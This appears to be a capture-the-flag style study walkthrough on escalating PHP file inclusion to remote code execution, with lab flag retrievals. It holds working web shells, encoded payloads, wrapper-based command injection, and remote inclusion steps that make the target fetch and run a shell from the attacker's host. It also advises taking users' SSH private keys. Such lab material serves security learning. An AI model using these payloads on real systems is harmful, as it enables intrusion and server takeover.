# Remote Code Execution

## PHP Wrappers

One easy and common method for gaining control over the back-end server is by enumerating user credentials and SSH keys, and then use those to login to the back-end server through SSH or any other remote session.

First we can check the `.ssh` directory in each user's home directory to grab their private key (`id_rsa`) and use it to SSH into the system.

***

The [data](https://www.php.net/manual/en/wrappers.data.php) wrapper can be used to include external data, including PHP code if the (`allow_url_include`) setting is enabled in the PHP configurations

PHP conf Apache: `/etc/php/X.Y/apache2/php.ini`

PHP conf Nginx: `/etc/php/X.Y/fpm/php.ini` where `X.Y` is your install PHP version

```shell-session
curl "http://<SERVER_IP>:<PORT>/index.php?language=php://filter/read=convert.base64-encode/resource=../../../../etc/php/7.4/apache2/php.ini"
```

`grep` for `allow_url_include ->`

```shell-session
ElFelixi0@htb[/htb]$ echo 'W1BIUF0KCjs7Ozs7Ozs7O...SNIP...4KO2ZmaS5wcmVsb2FkPQo=' | base64 -d | grep allow_url_include

allow_url_include = On
```

Now to gain RCE ->

```shell-session
echo '<?php system($_GET["cmd"]); ?>' | base64
```

Then with the base64 value we call the data wrapper:

```
http://<SERVER_IP>:<PORT>/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=id
```

Or in curl:

```shell-session
curl -s 'http://<SERVER_IP>:<PORT>/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=id' | grep uid
```

***

the [input](https://www.php.net/manual/en/wrappers.php.php) wrapper can be used to include external input and execute PHP code but the difference between it and the `data` wrapper is that we pass our input to the `input` wrapper as a POST request's data

To repeat our earlier attack but with the `input` wrapper, we can send a POST request to the vulnerable URL and add our web shell as POST data.

```shell-session
curl -s -X POST --data '<?php system($_GET["cmd"]); ?>' "http://<SERVER_IP>:<PORT>/index.php?language=php://input&cmd=id" | grep uid
```

***

the [expect](https://www.php.net/manual/en/wrappers.expect.php) wrapper allows us to directly run commands through URL streams

it needs to be manually installed and enabled on the back-end server so this time we need to `grep` for `expect`

```shell-session
echo 'W1BIUF0KCjs7Ozs7Ozs7O...SNIP...4KO2ZmaS5wcmVsb2FkPQo=' | base64 -d | grep expect
```

And if it's on , we can exploit this like this:

```shell-session
curl -s "http://<SERVER_IP>:<PORT>/index.php?language=expect://id"
```

_**Try to gain RCE using one of the PHP wrappers and read the flag at /**_

```
curl "http://94.237.59.63:52729/index.php?language=php://filter/read=convert.base64-encode/resource=../../../../etc/php/7.4/apache2/php.ini"
```

<figure><img src="../../../.gitbook/assets/image (1381).png" alt=""><figcaption></figcaption></figure>

```
<SNIP>%3D&cmd=ls%20-al"
```

<figure><img src="../../../.gitbook/assets/image (1382).png" alt=""><figcaption></figcaption></figure>

```
<SNIP>3D&cmd=ls%20-al%20/"
```

<figure><img src="../../../.gitbook/assets/image (1383).png" alt=""><figcaption></figcaption></figure>

```
curl "http://94.237.59.63:52729/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=cat%20/37809e2f8952f06139011994726d9ef1.txt"
```

## Remote File Inclusion (RFI)

if the vulnerable function allows the inclusion of remote URLs, we can&#x20;

1. Enumerating local-only ports and web applications (i.e. SSRF)
2. Gaining remote code execution by including a malicious script that we host

Here are some functions that (if vulnerable) would allow RFI

| **Function**                 | **Read Content** | **Execute** | **Remote URL** |
| ---------------------------- | :--------------: | :---------: | :------------: |
| **PHP**                      |                  |             |                |
| `include()`/`include_once()` |         ✅        |      ✅      |        ✅       |
| `file_get_contents()`        |         ✅        |      ❌      |        ✅       |
| **Java**                     |                  |             |                |
| `import`                     |         ✅        |      ✅      |        ✅       |
| **.NET**                     |                  |             |                |
| `@Html.RemotePartial()`      |         ✅        |      ❌      |        ✅       |
| `include`                    |         ✅        |      ✅      |        ✅       |

A reliable way to determine whether an LFI vulnerability is also vulnerable to RFI is to `try and include a URL`, and see if we can get its content. We sould start with [http://127.0.0.1:80/index.php](http://127.0.0.1/index.php)

```
http://<SERVER_IP>:<PORT>/index.php?language=http://127.0.0.1:80/index.php
```

<figure><img src="../../../.gitbook/assets/image (1384).png" alt=""><figcaption><p>vulnerable to RFI</p></figcaption></figure>

If the back-end server hosted any other local web applications (e.g. port `8080`), then we may be able to access them through the RFI vulnerability by applying SSRF

### Remote Code Execution with RFI

```shell-session
echo '<?php system($_GET["cmd"]); ?>' > shell.php
```

Now we host our payload:

```shell-session
sudo python3 -m http.server <LISTENING_PORT>
```

For the port, `80` or `443`, may be whitelisted in case the vulnerable web application has a firewall preventing outgoing connections

Now to use our shell.php ->

```
http://<SERVER_IP>:<PORT>/index.php?language=http://<OUR_IP>:<LISTENING_PORT>/shell.php&cmd=id
```

<figure><img src="../../../.gitbook/assets/image (1385).png" alt=""><figcaption></figcaption></figure>

we may also host our script through the FTP protocol

```shell-session
sudo python -m pyftpdlib -p 21
```

and the request would be ->

```
http://<SERVER_IP>:<PORT>/index.php?language=ftp://<OUR_IP>/shell.php&cmd=id
```

By default, PHP tries to authenticate as an anonymous user. If the server requires valid authentication, then the credentials can be specified in the URL, as follows:

```shell-session
 curl 'http://<SERVER_IP>:<PORT>/index.php?language=ftp://user:pass@localhost/shell.php&cmd=id'
```

If the vulnerable web application is hosted on a **Windows** **server** (which we can tell from the server version in the HTTP response headers), then we do not need the `allow_url_include` setting to be enabled for RFI exploitation, we can use SMB protocol because Windows treats files on remote SMB servers as normal files

```shell-session
impacket-smbserver -smb2support share $(pwd)
```

and the request would look like ->

```
http://<SERVER_IP>:<PORT>/index.php?language=\\<OUR_IP>\share\shell.php&cmd=whoami
```

<figure><img src="../../../.gitbook/assets/image (1386).png" alt=""><figcaption></figcaption></figure>

_**Attack the target, gain command execution by exploiting the RFI vulnerability, and then look for the flag under one of the directories in /**_

```
sudo pip install pyftpdlib
sudo python -m pyftpdlib -p 21
```

And the request will be:

```
http://10.129.196.211/index.php?language=ftp://10.10.15.34/shell.php&cmd=id
```

<figure><img src="../../../.gitbook/assets/image (1388).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (1389).png" alt=""><figcaption></figcaption></figure>

## LFI and File Uploads

If the vulnerable function has code `Execute` capabilities, then the code within the file we upload will get executed if we include it. For example we upload an image file (e.g. `image.jpg`), and store a PHP web shell code within it 'instead of image data', and if we include it through the LFI vulnerability, the PHP code will get executed and we will have remote code execution.

| **Function**                 | **Read Content** | **Execute** | **Remote URL** |
| ---------------------------- | :--------------: | :---------: | :------------: |
| **PHP**                      |                  |             |                |
| `include()`/`include_once()` |         ✅        |      ✅      |        ✅       |
| `require()`/`require_once()` |         ✅        |      ✅      |        ❌       |
| **NodeJS**                   |                  |             |                |
| `res.render()`               |         ✅        |      ✅      |        ❌       |
| **Java**                     |                  |             |                |
| `import`                     |         ✅        |      ✅      |        ✅       |
| **.NET**                     |                  |             |                |
| `include`                    |         ✅        |      ✅      |        ✅       |

To craft a malicious image, we must not forget the image magic byte just in case the upload form checks for both the extension and content type as well.

```shell-session
echo 'GIF8<?php system($_GET["cmd"]); ?>' > shell.gif
```

Then we upload our image and look were it has been uplaoded in the source code ->

```html
<img src="/profile_images/shell.gif" class="profile-image" id="profile-image">
```

And if we combine this to our LFI, we can get RCE ->

```
http://<SERVER_IP>:<PORT>/index.php?language=./profile_images/shell.gif&cmd=id
```

<figure><img src="../../../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>

Let's utilize the [zip](https://www.php.net/manual/en/wrappers.compression.php) wrapper to execute PHP code. However, this wrapper isn't enabled by default, so this method may not always work.

```shell-session
echo '<?php system($_GET["cmd"]); ?>' > shell.php && zip shell.jpg shell.php
```

Once we upload the `shell.jpg` archive, we can include it with the `zip` wrapper as (`zip://shell.jpg`), and then refer to any files within it with `#shell.php` (URL encoded)

And the URL will look like:

```
http://<SERVER_IP>:<PORT>/index.php?language=zip://./profile_images/shell.jpg%23shell.php&cmd=id
```

Now we can try and use the `phar://` wrapper to achieve a similar result:

```php
<?php
$phar = new Phar('shell.phar');
$phar->startBuffering();
$phar->addFromString('shell.txt', '<?php system($_GET["cmd"]); ?>');
$phar->setStub('<?php __HALT_COMPILER(); ?>');

$phar->stopBuffering();
```

next we need to compile into a `phar` file and rename it to `shell.jpg`

```shell-session
php --define phar.readonly=0 shell.php && mv shell.phar shell.jpg
```

And we can call it like this:

```
http://<SERVER_IP>:<PORT>/index.php?language=phar://./profile_images/shell.jpg%2Fshell.txt&cmd=id
```

_**Use any of the techniques covered in this section to gain RCE and read the flag at /**_

<figure><img src="../../../.gitbook/assets/image (1390).png" alt=""><figcaption></figcaption></figure>

```
http://83.136.255.43:42260/index.php?language=phar://./profile_images/shell.jpg%2Fshell.txt&cmd=cat%20/2f40d853e2d4768d87da1c81772bae0a.txt
```
